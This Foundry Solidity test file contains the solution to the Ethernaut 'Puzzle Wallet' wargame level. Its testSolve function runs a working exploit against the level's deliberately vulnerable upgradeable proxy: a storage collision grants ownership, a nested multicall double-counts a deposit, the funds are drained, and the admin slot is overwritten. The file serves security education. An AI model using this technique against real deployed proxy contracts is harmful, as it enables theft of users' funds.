// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {PuzzleWallet, PuzzleProxy} from "src/levels/PuzzleWallet.sol";
import {PuzzleWalletFactory} from "src/levels/PuzzleWalletFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestPuzzleWallet is Test, Utils {
    Ethernaut ethernaut;
    PuzzleWallet instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        PuzzleWalletFactory factory = new PuzzleWalletFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = PuzzleWallet(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public checkSolvedByPlayer{
        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);
        instance.addToWhitelist(player);

        bytes[] memory data1 = new bytes[](1);
        data1[0] = abi.encodeCall(PuzzleWallet.deposit, ());

        bytes[] memory data2 = new bytes[](2);
        data2[0] = abi.encodeCall(PuzzleWallet.deposit, ());
        data2[1] = abi.encodeCall(PuzzleWallet.multicall, data1);

        instance.multicall{value: 0.001 ether}(data2);

        instance.execute(player, 0.002 ether, "");

        instance.setMaxBalance(uint256(uint160(address(player))));
    }
}
